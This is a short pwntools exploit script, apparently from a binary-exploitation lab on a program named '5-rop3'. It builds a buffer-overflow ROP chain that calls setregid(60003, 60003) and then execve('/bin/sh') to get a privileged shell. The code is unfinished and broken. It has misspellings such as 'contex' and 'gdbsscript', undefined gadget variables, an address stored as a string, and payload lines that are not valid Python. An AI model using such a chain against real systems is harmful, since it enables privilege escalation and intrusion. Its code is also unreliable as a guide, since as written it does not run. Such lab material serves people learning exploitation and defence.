import sys
from pwn import *

contex.terminal = ['tmux', 'splitw', '-h']

e = ELF('./5-rop3')

p = gdb.debug([e.path], gdbsscript='''
              b *input_finc + 146
              continue
              plt
              ''')

setregid_addr = e.symbols['setregid']
execve_addr = e.symbols['execve']
#binsh_addr = e.search(b'/bin/sh').__next__()
#dr. jee's method
binsh_addr = '0x80482a3' #ad --> '/bin/sh'

#what should the next inst be? ==> pop; pop; ret; (so we can get rid of values on the stack)
#what should the neext inst2 be? ==> 

#this is the outline of the exploit
payload = b"A" * (0x88 + 4)  #fill up the buffer and reach RetIP
+ p32(setregid_addr) + p32(next_instr) +  p32(60003) + p32(60003) #setregid(60003, 60003)
+ p32(execve_addr) + p32(next_instr2) + p32(binsh_addr) + p32(0) + p32(0) #execve(binsh, 0, 0)

#remember to set the correct addresses for setregid and execve
